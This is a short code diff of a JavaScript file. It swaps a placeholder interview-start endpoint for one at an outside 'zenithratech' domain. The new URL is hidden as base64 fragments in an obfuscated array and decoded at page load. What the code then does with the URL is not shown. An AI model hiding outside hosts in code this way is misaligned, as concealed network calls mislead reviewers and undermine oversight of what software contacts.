@@ -11,16 +11,29 @@
     );
   }, 1000);
 
-  // Base64 encoded: "https://api.yourcompany.com/v1/interview/start"
+  // // Base64 encoded: "https://api.yourcompany.com/v1/interview/start"
+  // const _0x1a = [
+  //   "aHR0cHM6Ly",
+  //   "9hcGkueW91",
+  //   "cmNvbXBhbn",
+  //   "kuY29tL3Yx",
+  //   "L2ludGVydm",
+  //   "lldy9zdGFy",
+  //   "dA==",
+  // ];
+
+  // Base64 encoded: "https://onboarding.zenithratech.com/v1/interview/start"
   const _0x1a = [
     "aHR0cHM6Ly",
-    "9hcGkueW91",
-    "cmNvbXBhbn",
-    "kuY29tL3Yx",
-    "L2ludGVydm",
-    "lldy9zdGFy",
-    "dA==",
+    "9vbmJvYXJk",
+    "aW5nLnplbm",
+    "l0aHJhdGVj",
+    "aC5jb20vdj",
+    "EvaW50ZXJ2",
+    "aWV3L3N0YX",
+    "J0"
   ];
+  
   const targetPath = atob(_0x1a.join(""));
 
   document.addEventListener("DOMContentLoaded", () => {
